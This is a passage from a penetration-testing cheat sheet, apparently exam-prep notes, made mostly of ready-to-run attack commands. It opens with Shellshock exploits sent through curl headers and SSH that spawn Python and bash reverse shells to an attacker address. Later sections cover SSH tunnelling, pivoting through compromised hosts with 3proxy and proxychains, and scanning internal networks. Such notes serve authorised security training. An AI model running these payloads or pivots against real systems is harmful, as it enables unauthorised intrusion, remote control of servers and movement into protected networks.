curl -H "UserAgent: () { :; }; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.123\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" http://$ip/cgi-bin/test.sh
```

Shellshock over SSH:

```
ssh username@$ip '() { :;}; /bin/bash'
```

Exploit shellshock via curl, use -k switch to force curl to bypass any SSL warnings. Replace the bash command with anything.

```
curl http://192.168.123.123/path/to/cgi- bin/name_of_vuln_cgi -H "custom:() { ignored; }; /bin/bash -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1 "
```

### HeartBleed

Test web server

```
sslscan $ip:443
```

### Internet explorer 6

Vulnerable to msf exploit(ms10\_002\_aurora)

## Tunneling your traffic through another host

* ```
  sshuttle -r root@$ip 10.10.10.0/24
  ```

### Port forwarding

Simplest type of traffic redirection, consists on accepting traffic from one address and port port and redirecting it to another address and port.

It can be useful to bypass address and port based filters. Rinetd is a linux tool to do it.

### Local port forwarding

Creates an encrypted tunnel through two machines and have traffic redirected to a final host and port, similar to port forwarding This is useful when you are trying to connect from your machine to a destination using a gateway. The syntax is:

```
ssh gateway_host -L local_port:remote_host:remote_port
```

You can later create a SSH session to the local port and have and SSH tunneled to destination:

```
ssh hop_machine -L 31337:banned_machine:22
ssh -p 31337 localhost
```

### Remote port forwarding

It creates a tunnel from the target machine to your local machine, which allows connecting to an arbitrary port on the target. Useful if the target is in a non-routable network from your local machine. This is useful when you are trying to connect to a host, behind a firewall that blocks incoming connections. This technique works as the previous one, but the connection is started from the gateway. The syntax is:

```
ssh <gateway> -R <remote port to bind>:<local host>:<local port>
```

### Dynamic Port Forwarding

Allows to create a tunnel from the target to your machine, and have the traffic routed to any host through target. You can configure a local port to forward traffic to multiple destinations passing through a single host. It is similar to local port forwarding but allows multiple destinations. It uses the SOCKS protocol. The syntax is:

```
ssh -D local_port remote_add 
```

The connection of the previous command is established at port 22 of remote addr.

### Pivoting

1. drop 3proxy.exe
2. Set up a config file:

```
allow *_
internal IP_SAME_NETWORK
external IP_OTHER_NETWORK
socks -p1081
```

1. Add to **/etc/proxychains.conf**:

```
socks4  IP_SAME_NETWORK 1081
```

1. Scan:

```
proxychains nmap -sT -Pn IP_OTHER_NETWORK-250 --top-ports=5
```

### Double-pivoting

Pivoting through two different networks:

First, create a dynamic port forwarding through the first network:

```
ssh -f -N -D 9050 root@10.1.2.1
```

Edit **/etc/proxychains.conf** and add as default gateway:

```
socks4 127.0.0.1 9050
```

Use the proxy to create a second dynamic port forward to the second network:

```
proxychains ssh -f -N -D 10050 root@10.1.2.1 -p 22
```

Edit again **/etc/proxychains.conf** and add as default gateway:

```
socks4 127.0.0.1 10050
```

*   You can now use proxychains to pivot to the target network:

    ```
    proxychains nmap -sTV -n -PN 10.1.2.1 -254
    ```

## CVEs

* ```
  http://www.cvedetails.com/
  https://www.exploit-db.com/
  ```

## Word Lists

* ```
  /usr/share/seclists/
  /usr/share/wordlist/
  /usr/share/metasploit-framework/data/wordlists/
  ```

Minimal web server

* ```
  for i in 1 2 3 4 5 6 7; do echo -e '200 OK HTTP/1.1\r\nConnection:close\r\n\r\nfoo\r\n' |nc -q 0 -klvvp 80; done
  ```

##

## Proxy

Protocols

```
http://
http://
connect://
sock4://
sock5://
```
